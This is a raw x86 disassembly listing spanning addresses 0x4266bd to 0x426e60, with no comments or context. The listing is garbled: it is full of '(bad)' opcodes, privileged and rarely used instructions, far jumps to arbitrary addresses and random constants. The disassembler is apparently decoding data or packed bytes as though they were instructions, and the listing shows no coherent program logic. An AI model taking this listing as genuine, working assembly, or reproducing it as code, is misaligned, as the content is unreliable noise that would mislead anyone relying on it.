  4266bd:	jne    0x426729
  4266bf:	cmp    ch,BYTE PTR [ebp-0x3f]
  4266c2:	push   ecx
  4266c3:	std    
  4266c4:	xrelease mov BYTE PTR [edi+ebp*1],ah
  4266c8:	push   ecx
  4266c9:	shr    BYTE PTR [eax+0x3f0ce070],1
  4266cf:	retf   
  4266d0:	xchg   ebx,eax
  4266d1:	cwde   
  4266d2:	jle    0x42666a
  4266d4:	test   al,0x73
  4266d6:	aas    
  4266d7:	lahf   
  4266d8:	mov    bl,0x1e
  4266da:	add    DWORD PTR [eax-0x4f05d022],ecx
  4266e0:	rol    BYTE PTR [ebx+0x74d00225],cl
  4266e6:	addr16 dec edx
  4266e8:	bound  ecx,QWORD PTR [eax+edi*2-0x2cd5dbb6]
  4266ef:	dec    esp
  4266f0:	mov    eax,ds:0xdac9ef96
  4266f5:	(bad)
  4266f9:	cwde   
  4266fa:	icebp  
  4266fb:	mov    esi,0x7bd43ed8
  426700:	adc    esi,eax
  426702:	cdq    
  426703:	lahf   
  426704:	mov    dh,0x3
  426706:	inc    eax
  426707:	adc    eax,0x4fe00943
  42670c:	sub    edi,DWORD PTR ds:0x13479f3d
  426712:	popa   
  426713:	cmp    al,0xd9
  426715:	push   ecx
  426716:	dec    ecx
  426717:	dec    edi
  426718:	add    edx,edx
  42671a:	inc    edi
  42671b:	or     BYTE PTR [ecx-0x5e],bl
  42671e:	loop   0x426774
  426720:	and    al,0x6
  426722:	aaa    
  426723:	push   ss
  426724:	inc    edi
  426725:	mov    cl,0xd1
  426727:	shl    BYTE PTR [ecx],cl
  426729:	(bad)  
  42672a:	and    esi,ecx
  42672c:	adc    BYTE PTR ds:0x325c5526,al
  426732:	rcl    DWORD PTR [ecx],0x22
  426735:	sahf   
  426736:	sub    BYTE PTR [edx+0x28],0x4a
  42673a:	mov    esi,?
  42673c:	sti    
  42673d:	rcr    DWORD PTR [esi],0x1e
  426740:	mov    ah,BYTE PTR [eax+esi*8-0x4e]
  426744:	aad    0x15
  426746:	in     al,dx
  426747:	loope  0x4266e5
  426749:	arpl   WORD PTR [edx],bp
  42674b:	jns    0x4266d5
  42674d:	aaa    
  42674e:	pop    ebp
  42674f:	cmc    
  426750:	fcomp  QWORD PTR [ebp+0x6a]
  426753:	int3   
  426754:	xlat   BYTE PTR ds:[ebx]
  426755:	jae    0x426728
  426757:	fild   DWORD PTR [ecx+0x285f1e3c]
  42675d:	loopne 0x426752
  42675f:	lock test DWORD PTR [edx+0x5],esp
  426763:	mov    esi,0x9eeccc7d
  426768:	lods   al,BYTE PTR ds:[esi]
  426769:	jg     0x426782
  42676b:	aaa    
  42676c:	loop   0x42676e
  42676e:	les    ebx,FWORD PTR [eax]
  426770:	es mov al,0xc6
  426773:	mov    WORD PTR [eax+0x52],?
  426776:	sbb    edi,DWORD PTR [ebx-0x4b232429]
  42677c:	mul    ebx
  42677e:	mov    ebp,0xe4f3f81c
  426783:	sar    bh,1
  426785:	cmp    DWORD PTR [edi+0x65cd910b],esi
  42678b:	sbb    al,0x99
  42678d:	dec    eax
  42678e:	loopne 0x4267cc
  426790:	pop    es
  426791:	jnp    0x426739
  426793:	in     al,dx
  426794:	and    dl,cl
  426796:	or     ebp,DWORD PTR [edx+0x6ee14fb2]
  42679c:	or     eax,0x37f528fb
  4267a1:	stos   BYTE PTR es:[edi],al
  4267a2:	cs pop esi
  4267a4:	icebp  
  4267a5:	repnz std 
  4267a7:	cmp    BYTE PTR [ecx+0x71],dh
  4267aa:	adc    ebx,edi
  4267ac:	sub    eax,0x28b03846
  4267b1:	pop    ss
  4267b2:	cmp    DWORD PTR [eax+0x55],ecx
  4267b5:	rcl    ecx,0x1
  4267b8:	bswap  ecx
  4267ba:	and    BYTE PTR [ecx],bh
  4267bc:	jnp    0x426779
  4267be:	or     DWORD PTR [eax-0x47],0x6bd6778c
  4267c5:	call   0xee728fae
  4267ca:	cs loop 0x426760
  4267cd:	lea    ebx,[esi+ecx*8]
  4267d0:	mov    cs,edi
  4267d2:	pusha  
  4267d3:	cmp    DWORD PTR [edx],0xffffffd0
  4267d6:	outs   dx,DWORD PTR ds:[esi]
  4267d7:	pop    ss
  4267d8:	pop    ss
  4267d9:	jo     0x42675c
  4267db:	mov    edx,DWORD PTR [edx-0x79c7c48a]
  4267e1:	add    DWORD PTR [edi+0x48bdab37],esi
  4267e7:	fdiv   QWORD PTR [ebx-0xf9649f0]
  4267ed:	adc    bh,BYTE PTR ds:0xda70204f
  4267f3:	and    BYTE PTR [esi],bh
  4267f5:	jmp    0x783cd400
  4267fa:	vpacksswb ymm2,ymm3,YMMWORD PTR [esi+0x6]
  4267ff:	xchg   esi,eax
  426800:	xchg   DWORD PTR [ecx-0x44],ecx
  426803:	dec    ecx
  426804:	adc    DWORD PTR [ecx+0x8],0xffffff82
  426808:	xor    bl,BYTE PTR [ecx+0x31f15482]
  42680e:	and    edx,DWORD PTR [edx]
  426810:	test   DWORD PTR [ecx],edx
  426812:	cwde   
  426813:	mov    esi,0x9854f166
  426818:	xchg   ecx,eax
  426819:	pop    edx
  42681a:	data16 xchg BYTE PTR [eax-0x7ffdce7],ah
  426821:	xor    eax,0x96efe40f
  426826:	icebp  
  426827:	mov    bh,0x78
  426829:	or     eax,0xfde65e64
  42682e:	ret    
  42682f:	(bad)  
  426830:	mov    dl,BYTE PTR es:[bx+di]
  426834:	pop    ebp
  426835:	fdiv   DWORD PTR [edx]
  426837:	scas   al,BYTE PTR es:[edi]
  426838:	das    
  426839:	mov    ecx,0x68936202
  42683e:	ret    0x1217
  426841:	jb     0x426850
  426843:	pop    ecx
  426844:	stos   DWORD PTR es:[edi],eax
  426845:	push   ecx
  426846:	(bad)  
  426847:	sbb    BYTE PTR [esp+eax*4-0x6e298544],ah
  42684e:	cmp    BYTE PTR [eax+eiz*2],0xe5
  426852:	cmp    DWORD PTR [ebx],ebx
  426854:	inc    esp
  426855:	mov    eax,0xf1056c58
  42685a:	daa    
  42685b:	cld    
  42685c:	in     al,0x10
  42685e:	dec    ecx
  42685f:	hlt    
  426860:	sub    dl,BYTE PTR [edx]
  426862:	les    edx,FWORD PTR [edi-0x69d3ce54]
  426868:	stos   BYTE PTR es:[edi],al
  426869:	push   0x91c1d50
  42686e:	xor    eax,0x28db27a9
  426873:	mov    ecx,0xb1a1d6d
  426878:	in     eax,dx
  426879:	cld    
  42687a:	push   ebx
  42687b:	inc    esp
  42687c:	fcom   st(5)
  42687e:	sub    eax,0xc88e6b8
  426883:	dec    esi
  426884:	ins    DWORD PTR es:[edi],dx
  426885:	(bad)  
  426886:	shl    BYTE PTR [ebx-0x2f8ff7fe],1
  42688c:	xchg   DWORD PTR [edx],esi
  42688e:	and    esp,ebx
  426890:	dec    esi
  426891:	xor    al,0xf1
  426893:	scas   al,BYTE PTR es:[edi]
  426894:	lods   eax,DWORD PTR ds:[esi]
  426895:	inc    ecx
  426896:	add    ebx,DWORD PTR [eax+0x25]
  426899:	icebp  
  42689a:	iret   
  42689b:	jnp    0x426861
  42689d:	das    
  42689e:	(bad)  
  42689f:	cmp    bh,BYTE PTR [edi+edi*8-0x41]
  4268a3:	mov    eax,0x599fe574
  4268a8:	sub    dh,al
  4268aa:	fs fadd st,st(2)
  4268ad:	sub    ah,cl
  4268af:	cwde   
  4268b0:	pop    DWORD PTR [esi+0x5812cfb7]
  4268b6:	es sti 
  4268b8:	xchg   ecx,eax
  4268b9:	xchg   DWORD PTR [edi+0xb52343],ebx
  4268bf:	add    al,0x1
  4268c1:	dec    eax
  4268c2:	hlt    
  4268c3:	in     al,dx
  4268c4:	in     eax,dx
  4268c5:	sbb    DWORD PTR [ebx],ebx
  4268c7:	(bad)  
  4268c8:	xlat   BYTE PTR ds:[ebx]
  4268c9:	sbb    al,0x54
  4268cb:	dec    ecx
  4268cc:	enter  0x32ff,0x9a
  4268d0:	inc    esi
  4268d1:	or     DWORD PTR [ebx+ecx*2+0x75],0x6d074a13
  4268d9:	adc    ch,BYTE PTR [ebx-0x71]
  4268dc:	ret    0xcc8c
  4268df:	daa    
  4268e0:	popf   
  4268e1:	inc    esp
  4268e2:	xchg   DWORD PTR [eax+0x54a0a2c6],ebp
  4268e8:	mov    DWORD PTR [ebp+esi*8+0x46],esi
  4268ec:	xchg   ebx,eax
  4268ed:	hlt    
  4268ee:	push   edx
  4268ef:	inc    ebx
  4268f0:	and    al,0x9e
  4268f2:	aam    0x75
  4268f4:	add    eax,0xe069df7e
  4268f9:	or     esp,DWORD PTR [ebx]
  4268fb:	adc    ebx,DWORD PTR [eax-0x14]
  4268fe:	push   es
  4268ff:	jo     0x4268d0
  426901:	fisub  DWORD PTR [edx]
  426903:	pop    esi
  426904:	rcl    DWORD PTR [edi-0x2f],1
  426907:	xchg   ebp,eax
  426908:	adc    al,0xb2
  42690a:	add    ebp,edx
  42690c:	jb     0x4268bb
  42690e:	(bad)  
  42690f:	jge    0x42692a
  426911:	or     ebp,ecx
  426913:	push   esp
  426914:	pop    ds
  426915:	jge    0x426969
  426917:	jns    0x426950
  426919:	popf   
  42691a:	shl    DWORD PTR [edi+0x38bacb97],0x88
  426921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426922:	add    al,0x97
  426924:	loopne 0x42694d
  426926:	retf   
  426927:	mov    DWORD PTR [edx-0x50],ecx
  42692a:	ins    DWORD PTR es:[edi],dx
  42692b:	add    al,0x8c
  42692d:	shr    bh,0xc
  426930:	xchg   esp,eax
  426931:	xor    BYTE PTR [esi],ah
  426933:	push   ds
  426934:	sbb    BYTE PTR ss:[eax-0xd11c75c],al
  42693b:	mov    eax,0xee1c98db
  426940:	js     0x42694c
  426942:	dec    ebp
  426943:	dec    edx
  426944:	cld    
  426945:	mov    edi,0x37508fcf
  42694a:	das    
  42694b:	jecxz  0x4268e2
  42694d:	jecxz  0x4269b0
  42694f:	popf   
  426950:	shr    BYTE PTR [ebx-0x5e4de97e],cl
  426956:	push   ds
  426957:	pop    esi
  426958:	and    dl,cl
  42695a:	pop    es
  42695b:	enter  0x5ed9,0xa9
  42695f:	mov    esp,0xc4f7ea04
  426964:	inc    esp
  426965:	jmp    0x1b5343f2
  42696a:	sar    DWORD PTR [ebp+0x71a6f157],0x9c
  426971:	pop    ecx
  426972:	das    
  426973:	ret    0xea6
  426976:	mov    ah,0x55
  426978:	in     eax,dx
  426979:	mov    al,ds:0x5b85b1b1
  42697e:	fisttp DWORD PTR [ebp+0x3c]
  426981:	pop    eax
  426982:	stos   BYTE PTR es:[edi],al
  426983:	jecxz  0x4269db
  426985:	cmp    ecx,DWORD PTR [edx+0x7f0b095d]
  42698b:	adc    ebx,ebx
  42698d:	test   DWORD PTR [ebx-0x418e077],ebp
  426993:	sbb    eax,0x2e2f0fc
  426998:	pop    edx
  426999:	pop    esp
  42699a:	stc    
  42699b:	out    0x9d,eax
  42699d:	inc    ecx
  42699e:	cmovo  esi,DWORD PTR [ebx]
  4269a1:	out    dx,al
  4269a2:	pop    ecx
  4269a3:	stos   BYTE PTR es:[edi],al
  4269a4:	add    cl,BYTE PTR [ebx-0x16]
  4269a7:	mov    ds:0xb026c599,eax
  4269ac:	fsubr  QWORD PTR [esi+eax*8]
  4269af:	popa   
  4269b0:	push   es
  4269b1:	mov    ecx,0xe213b024
  4269b6:	or     ebx,esp
  4269b8:	adc    BYTE PTR [ebx+0x71],cl
  4269bb:	(bad)  
  4269bc:	cmp    eax,DWORD PTR [eax]
  4269be:	and    bh,ch
  4269c0:	sub    al,0x6f
  4269c2:	ins    DWORD PTR es:[edi],dx
  4269c3:	inc    esp
  4269c4:	jb     0x426a11
  4269c6:	imul   ebp,DWORD PTR [ecx+esi*2-0x77],0xe214e489
  4269ce:	pop    ds
  4269cf:	mov    ds,ecx
  4269d1:	aaa    
  4269d2:	or     DWORD PTR [ecx-0x8],edi
  4269d5:	loopne 0x4269e4
  4269d7:	mov    bh,0xf0
  4269d9:	xor    ah,cl
  4269db:	mov    bh,0x99
  4269dd:	fwait
  4269de:	outs   dx,DWORD PTR ds:[esi]
  4269df:	ret    0x8939
  4269e2:	cmc    
  4269e3:	push   ss
  4269e4:	or     DWORD PTR [esi+0x37],edx
  4269e7:	scas   al,BYTE PTR es:[edi]
  4269e8:	imul   esi,DWORD PTR [esi+0x42],0x2
  4269ec:	jbe    0x426a10
  4269ee:	and    DWORD PTR [ecx+0x3d],edx
  4269f1:	int3   
  4269f2:	shl    BYTE PTR [ebx],0x33
  4269f5:	lock sub DWORD PTR [edx-0x3d7c6e63],eax
  4269fc:	pop    eax
  4269fd:	aad    0x7c
  4269ff:	lds    edx,FWORD PTR [edi+0x6520eb2e]
  426a05:	in     al,0xf3
  426a07:	fidivr WORD PTR [ecx]
  426a09:	(bad)  [ebp+0x41fe0c01]
  426a0f:	jb     0x4269eb
  426a11:	into   
  426a12:	ins    BYTE PTR es:[edi],dx
  426a13:	push   eax
  426a14:	xchg   ebp,eax
  426a15:	retf   0xe9c1
  426a18:	data16 sbb BYTE PTR [edi-0x539e33b3],bl
  426a1f:	mov    ecx,0x8b3a7084
  426a24:	das    
  426a25:	lods   eax,DWORD PTR ds:[esi]
  426a26:	xlat   BYTE PTR ds:[ebx]
  426a27:	push   ecx
  426a28:	lods   al,BYTE PTR ds:[esi]
  426a29:	xor    eax,0x70258b10
  426a2e:	(bad)
  426a31:	push   esi
  426a32:	imul   ebp,DWORD PTR ds:0x8cb2b53c,0x51
  426a39:	xchg   ebp,eax
  426a3a:	add    ecx,DWORD PTR [edi+0x42]
  426a3d:	push   edi
  426a3e:	leave  
  426a3f:	gs adc ebx,ebx
  426a42:	xchg   BYTE PTR [edx+0x4],cl
  426a45:	dec    edi
  426a46:	nop
  426a47:	jmp    0x6d707e87
  426a4c:	gs sbb eax,0x917240e7
  426a52:	adc    dh,al
  426a54:	mov    BYTE PTR [eax],dh
  426a56:	jmp    FWORD PTR [edi-0x25]
  426a59:	inc    ebp
  426a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a5b:	aad    0xd1
  426a5d:	cs mov edi,0xd563de8b
  426a63:	arpl   WORD PTR [eax],cx
  426a65:	lea    cx,[eax]
  426a68:	icebp  
  426a69:	pop    esp
  426a6a:	add    BYTE PTR [ebx],bh
  426a6c:	inc    ebx
  426a6d:	scas   al,BYTE PTR es:[edi]
  426a6e:	lds    edx,FWORD PTR [esi]
  426a70:	and    bl,ch
  426a72:	sbb    al,0xf1
  426a74:	or     ch,al
  426a76:	lods   al,BYTE PTR ds:[esi]
  426a77:	neg    BYTE PTR [edi+esi*8-0x32]
  426a7b:	mov    ah,ch
  426a7d:	sbb    DWORD PTR [ecx],0x105e211b
  426a83:	xor    DWORD PTR [edx-0x400ce731],ebx
  426a89:	fwait
  426a8a:	xchg   DWORD PTR [edi-0x3bbb269b],esp
  426a90:	cmp    eax,0x924b97dc
  426a95:	push   esi
  426a96:	inc    edx
  426a97:	cmp    BYTE PTR [edi+0x2c],dl
  426a9a:	adc    eax,ebp
  426a9c:	add    al,0x48
  426a9e:	clc    
  426a9f:	xchg   esi,eax
  426aa0:	outs   dx,BYTE PTR ds:[esi]
  426aa1:	jb     0x426a4d
  426aa3:	xor    ch,BYTE PTR [edx+0x7b]
  426aa6:	push   esp
  426aa7:	jg     0x426b00
  426aa9:	fstp   TBYTE PTR ds:0x4bd21df4
  426aaf:	push   eax
  426ab0:	test   DWORD PTR [edi],eax
  426ab2:	stos   DWORD PTR es:[edi],eax
  426ab3:	inc    eax
  426ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ab5:	es push cs
  426ab7:	xchg   ecx,eax
  426ab8:	cwde   
  426ab9:	fisttp WORD PTR [eax-0x32]
  426abc:	jns    0x426ae3
  426abe:	fistp  QWORD PTR [ebx+0x70]
  426ac1:	je     0x426ad5
  426ac3:	cmc    
  426ac4:	jb     0x426ac9
  426ac6:	imul   ecx,DWORD PTR [edx],0x891477c0
  426acc:	mov    dh,0x7b
  426ace:	sbb    eax,0xe25d069d
  426ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ad4:	lds    esi,FWORD PTR [ebx+0x3]
  426ad7:	(bad)  
  426ad8:	rcl    DWORD PTR [ebx+0x3],cl
  426adb:	dec    ebp
  426adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426add:	adc    DWORD PTR ds:0x68b77454,ebp
  426ae3:	test   eax,0x42e8a083
  426ae8:	call   0x32ed:0xb4494ae3
  426aef:	popa   
  426af0:	push   edx
  426af1:	adc    eax,ecx
  426af3:	lods   al,BYTE PTR ds:[esi]
  426af4:	push   ebp
  426af5:	das    
  426af6:	pop    es
  426af7:	push   edi
  426af8:	push   0xffffff9d
  426afa:	dec    ecx
  426afb:	(bad)  
  426afc:	push   edi
  426afd:	jmp    0x2e25a30f
  426b02:	xchg   BYTE PTR fs:[edx+0x4d1e3c9],bh
  426b09:	out    dx,al
  426b0a:	jecxz  0x426b4c
  426b0c:	pop    edi
  426b0d:	cmp    DWORD PTR [edx-0x3d],esp
  426b10:	sub    eax,0xe858a26f
  426b15:	shr    dh,0xb4
  426b18:	adc    edi,esp
  426b1a:	or     al,BYTE PTR [esi-0x47844d48]
  426b20:	shl    BYTE PTR [ebx-0x4b3ca897],cl
  426b26:	in     eax,0x23
  426b28:	dec    ecx
  426b29:	push   esp
  426b2a:	dec    ebx
  426b2b:	sub    eax,0x3c59e204
  426b30:	mov    al,0x91
  426b32:	inc    esp
  426b33:	xchg   BYTE PTR [edx-0x20],bh
  426b36:	jecxz  0x426b63
  426b38:	push   ebp
  426b39:	mov    esp,0x1302667a
  426b3e:	dec    esi
  426b3f:	or     eax,0xd212b595
  426b44:	add    BYTE PTR fs:[ebx],dh
  426b47:	mov    ch,0x26
  426b49:	jle    0x426bab
  426b4b:	ja     0x426b69
  426b4d:	pop    ds
  426b4e:	call   0x3789:0xea2105b8
  426b55:	test   DWORD PTR [esp+ebp*2+0x5d],ebx
  426b59:	pop    edx
  426b5a:	ret    0x85dd
  426b5d:	dec    ebp
  426b5e:	ins    DWORD PTR es:[edi],dx
  426b5f:	std    
  426b60:	mov    edi,0xdc0bebc0
  426b65:	xchg   ebx,eax
  426b66:	repnz inc edi
  426b68:	xor    cx,WORD PTR [ecx+esi*1]
  426b6c:	jb     0x426b77
  426b6e:	xor    DWORD PTR [ecx-0x2addc037],ebx
  426b74:	and    eax,0xdf084e52
  426b79:	aam    0xc9
  426b7b:	lds    esi,FWORD PTR [esi+0x20]
  426b7e:	inc    esp
  426b7f:	and    dl,dl
  426b81:	data16 adc BYTE PTR cs:[esi+0x7f528c94],dh
  426b89:	lea    esi,[di-0x6d]
  426b8d:	mov    es,eax
  426b8f:	bound  ebx,QWORD PTR [edi+0x8]
  426b92:	ror    bh,0xe9
  426b95:	xchg   edi,eax
  426b96:	imul   esp,edx,0xfffffffb
  426b99:	xor    BYTE PTR ds:0x6307c0d3,al
  426b9f:	sub    al,0x82
  426ba1:	fs dec esp
  426ba3:	dec    ecx
  426ba4:	das    
  426ba5:	mov    edx,0xb398d77d
  426baa:	adc    al,0x1
  426bac:	adc    eax,0x1f81d798
  426bb1:	or     al,0x25
  426bb3:	test   al,0xc3
  426bb5:	hlt    
  426bb6:	in     eax,dx
  426bb7:	or     eax,DWORD PTR [ebx+0x10]
  426bba:	and    DWORD PTR [ecx-0x2ccb5797],0xffffff80
  426bc1:	inc    ebp
  426bc2:	aaa    
  426bc3:	push   ss
  426bc4:	mov    eax,ds:0xc4057a60
  426bc9:	ds and ecx,esi
  426bcc:	lock push edx
  426bce:	inc    ebp
  426bcf:	dec    edx
  426bd0:	mov    cl,al
  426bd2:	sub    BYTE PTR [esi],al
  426bd4:	lock inc esi
  426bd6:	repnz stc 
  426bd8:	mov    esi,DWORD PTR [ebp-0x486e5150]
  426bde:	jmp    0x25c5:0x9c327006
  426be5:	mov    ss,WORD PTR [esi-0xf]
  426be8:	test   BYTE PTR [edi+0x1d79366f],cl
  426bee:	push   ebp
  426bef:	push   ds
  426bf0:	stos   DWORD PTR es:[edi],eax
  426bf1:	xchg   DWORD PTR ds:0x34e86363,edi
  426bf7:	jmp    0x426c51
  426bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bfa:	pop    esi
  426bfb:	pop    ds
  426bfc:	in     al,0x7b
  426bfe:	adc    al,0x76
  426c00:	fadd   DWORD PTR [ebx-0x5e]
  426c03:	stc    
  426c04:	out    dx,al
  426c05:	push   0x1
  426c07:	mov    eax,ds:0x2a33177e
  426c0c:	out    0x9f,al
  426c0e:	push   0xffffff84
  426c10:	dec    ebp
  426c11:	loope  0x426c25
  426c13:	mov    ds:0x60a25cf4,eax
  426c18:	leave  
  426c19:	xchg   ecx,eax
  426c1a:	xor    BYTE PTR [esi],bh
  426c1c:	jmp    0x27eb1c59
  426c21:	aas    
  426c22:	pop    es
  426c23:	ins    BYTE PTR es:[edi],dx
  426c24:	sbb    eax,DWORD PTR [ebp-0x35481f29]
  426c2a:	xor    cl,BYTE PTR [ebp+0xbf3a25f]
  426c30:	in     al,0xef
  426c32:	sbb    esi,ebx
  426c34:	xor    DWORD PTR [ebx+0x30],esp
  426c37:	inc    esp
  426c38:	mov    ebp,0xd7498f11
  426c3d:	fwait
  426c3e:	lahf   
  426c3f:	inc    esp
  426c40:	cwde   
  426c41:	or     ch,BYTE PTR [edx-0x15]
  426c44:	ret    0xeaf
  426c47:	and    al,0x6
  426c49:	push   eax
  426c4a:	icebp  
  426c4b:	sub    BYTE PTR [eax+0xfc5dfb9],0x4e
  426c52:	push   ebx
  426c53:	(bad)  
  426c54:	test   BYTE PTR [ecx],0xf9
  426c57:	call   FWORD PTR [eax-0x2db094f4]
  426c5d:	(bad)  
  426c5e:	sub    ah,BYTE PTR ds:0x76a516fb
  426c64:	aad    0xd1
  426c66:	cmp    al,0x11
  426c68:	push   edi
  426c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c6a:	arpl   WORD PTR [eax],bp
  426c6c:	xchg   ecx,eax
  426c6d:	add    dl,BYTE PTR [edi-0x25]
  426c70:	sub    al,dh
  426c72:	mov    eax,ds:0x2efc33a7
  426c77:	aad    0xeb
  426c79:	adc    al,0x8a
  426c7b:	popa   
  426c7c:	in     al,dx
  426c7d:	mov    ds:0x553570ca,eax
  426c82:	sahf   
  426c83:	out    0xed,eax
  426c85:	xchg   esp,eax
  426c86:	push   0x1c
  426c88:	mov    DWORD PTR [ecx],edi
  426c8a:	xor    al,bl
  426c8c:	mov    dh,0x6b
  426c8e:	loope  0x426c5e
  426c90:	mov    ch,0x35
  426c92:	(bad)  
  426c94:	scas   al,BYTE PTR es:[edi]
  426c95:	call   0x795a06b8
  426c9a:	lahf   
  426c9b:	jae    0x426cb9
  426c9d:	sar    BYTE PTR [ebp+0x71acc1c],1
  426ca3:	jl     0x426c72
  426ca5:	iret   
  426ca6:	fld    QWORD PTR [eax]
  426ca8:	imul   DWORD PTR [edi+0x639fc69e]
  426cae:	rcl    DWORD PTR [bx+si-0x37],cl
  426cb2:	test   DWORD PTR [eax],esi
  426cb4:	add    eax,DWORD PTR [ebx-0x1ed7824c]
  426cba:	test   eax,0x5745a600
  426cbf:	push   cs
  426cc0:	dec    ecx
  426cc1:	ficomp DWORD PTR [eax-0x1787db68]
  426cc7:	cli    
  426cc8:	add    BYTE PTR [ebx+0x5c],dl
  426ccb:	dec    esp
  426ccc:	mov    dl,0x96
  426cce:	sub    al,0x19
  426cd0:	rol    BYTE PTR [edi-0x77],0x2
  426cd4:	push   esi
  426cd5:	mov    eax,0x7415379
  426cda:	inc    edi
  426cdb:	daa    
  426cdc:	push   esp
  426cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cde:	push   esi
  426cdf:	dec    ebx
  426ce0:	out    0x62,eax
  426ce2:	pop    ds
  426ce3:	retf   0xf5f4
  426ce6:	and    ch,BYTE PTR [edi+0x52]
  426ce9:	pop    edx
  426cea:	iret   
  426ceb:	out    0x39,eax
  426ced:	test   eax,0xd4f5005a
  426cf2:	sub    BYTE PTR [edx],al
  426cf4:	pop    ebp
  426cf5:	aad    0xf0
  426cf7:	rol    esi,0x9
  426cfa:	push   ds
  426cfb:	mov    bh,BYTE PTR [esi-0x35]
  426cfe:	push   esi
  426cff:	popf   
  426d00:	(bad)  
  426d01:	xchg   ecx,eax
  426d02:	in     al,0x66
  426d04:	jbe    0x426cd1
  426d06:	inc    ebp
  426d07:	add    al,0x2b
  426d09:	xor    eax,0xf7ce48bc
  426d0e:	pop    es
  426d0f:	adc    edx,DWORD PTR [esi]
  426d11:	(bad)  
  426d12:	neg    eax
  426d14:	sub    eax,0x503aa058
  426d19:	stos   BYTE PTR es:[edi],al
  426d1a:	adc    al,0x70
  426d1c:	or     BYTE PTR [edx+eiz*8-0x4fe8d0a],0x9b
  426d24:	or     eax,0xedc7193d
  426d29:	outs   dx,BYTE PTR ds:[esi]
  426d2a:	xchg   edi,eax
  426d2b:	jnp    0x426d7f
  426d2d:	cs lahf 
  426d2f:	loope  0x426d07
  426d31:	pop    edi
  426d32:	xchg   edx,eax
  426d33:	fsub   DWORD PTR [ecx]
  426d35:	jp     0x426ce6
  426d37:	dec    eax
  426d38:	mov    dh,0xe1
  426d3a:	js     0x426dbb
  426d3c:	fldenv [eax+0x21]
  426d3f:	push   cs
  426d40:	cmp    eax,edi
  426d42:	popa   
  426d43:	jecxz  0x426d40
  426d45:	repnz sub al,0x3d
  426d48:	std    
  426d49:	jp     0x426d23
  426d4b:	pop    ecx
  426d4c:	adc    DWORD PTR [esi],esp
  426d4e:	or     DWORD PTR [edi+0x3b126f6a],edi
  426d54:	(bad)  [ebp-0x37]
  426d57:	jge    0x426d25
  426d59:	push   eax
  426d5a:	pop    edi
  426d5b:	popa   
  426d5c:	dec    eax
  426d5d:	mov    ax,ds:0x6f3ad311
  426d63:	xor    ah,BYTE PTR [edx]
  426d65:	push   ebx
  426d66:	add    eax,0xe2935d30
  426d6b:	(bad)  
  426d6c:	xchg   ecx,eax
  426d6d:	(bad)  
  426d6e:	xlat   BYTE PTR ds:[ebx]
  426d6f:	push   edx
  426d70:	or     BYTE PTR [ebp+0x3d],dl
  426d73:	fstp   DWORD PTR [edi-0x4e]
  426d77:	shl    DWORD PTR [edx+0x73],1
  426d7a:	xor    BYTE PTR [ebx-0x3e],ch
  426d7d:	ja     0x426d0b
  426d7f:	jnp    0x426d1b
  426d81:	add    eax,0x4bd60450
  426d86:	repnz dec eax
  426d88:	rcr    BYTE PTR [ebx-0x25],1
  426d8b:	and    al,0x76
  426d8d:	and    al,BYTE PTR [edi]
  426d8f:	mov    cl,0x8c
  426d91:	mov    ebx,edx
  426d93:	and    eax,DWORD PTR [eax+eiz*1-0x6a]
  426d97:	jo     0x426da2
  426d99:	push   ds
  426d9a:	sti    
  426d9b:	xchg   ecx,eax
  426d9c:	stos   DWORD PTR es:[edi],eax
  426d9d:	adc    DWORD PTR [edi],0xbb2451ea
  426da3:	push   cs
  426da4:	dec    esi
  426da5:	mov    ch,0x3
  426da7:	mov    edx,0x5e69d41b
  426dac:	pusha  
  426dad:	mov    ebp,DWORD PTR [eax-0x76a82d51]
  426db3:	cs pop ebp
  426db5:	pop    esp
  426db6:	xchg   ebp,eax
  426db7:	or     esp,DWORD PTR [ebx-0x33]
  426dba:	dec    ebp
  426dbb:	shr    BYTE PTR [ebp+0x16],0xb1
  426dbf:	lds    eax,FWORD PTR [ebx]
  426dc1:	push   ds
  426dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dc3:	pop    esi
  426dc4:	pop    esp
  426dc5:	and    eax,0x1b4eb891
  426dca:	sub    esp,DWORD PTR ds:0x868ca22
  426dd0:	mov    bl,0x71
  426dd2:	aad    0x89
  426dd4:	push   edi
  426dd5:	xor    eax,0x3ce80d9d
  426dda:	sub    DWORD PTR [eax-0x3e3bd656],0x89a541fc
  426de4:	je     0x426d91
  426de6:	stos   DWORD PTR es:[edi],eax
  426de7:	sti    
  426de8:	and    cl,BYTE PTR [eax-0xe]
  426deb:	pop    DWORD PTR [eax-0x21]
  426dee:	xor    eax,0x410ef6f8
  426df3:	add    BYTE PTR [esi-0x1f733829],ah
  426df9:	xor    al,0x23
  426dfb:	inc    ebp
  426dfc:	int    0x5a
  426dfe:	mov    dh,BYTE PTR [edx-0x25f6edd9]
  426e04:	xchg   DWORD PTR [edi+0x4bfe050a],ecx
  426e0a:	push   ebx
  426e0b:	pop    ss
  426e0c:	inc    ebp
  426e0d:	cld    
  426e0e:	rcr    BYTE PTR ds:0x3dcad159,cl
  426e14:	cld    
  426e15:	loop   0x426e3e
  426e17:	cmp    edi,ecx
  426e19:	cmc    
  426e1a:	xchg   ecx,eax
  426e1b:	sub    al,0xce
  426e1d:	aaa    
  426e1e:	fisubr DWORD PTR [eax]
  426e20:	test   eax,0x939c193e
  426e25:	adc    eax,0x52a9a208
  426e2a:	jge    0x426e87
  426e2c:	cmp    DWORD PTR [eax],0xffffff86
  426e2f:	adc    al,0xd5
  426e31:	mov    eax,ds:0xc801aab2
  426e36:	or     DWORD PTR [ebp+0x2225e449],esp
  426e3c:	or     ebx,0x4787fb3c
  426e42:	jb     0x426eb4
  426e44:	lods   al,BYTE PTR ds:[esi]
  426e45:	and    BYTE PTR [edx-0x77],dh
  426e48:	mov    eax,0x2fbdb6ae
  426e4d:	push   ds
  426e4e:	ret    
  426e4f:	jb     0x426e06
  426e51:	test   DWORD PTR [edx],ebp
  426e53:	add    eax,0x2d513fe1
  426e58:	enter  0xe171,0xd7
  426e5c:	cmp    al,dh
  426e5e:	or     al,0x7
  426e60:	jns    0x426e9c
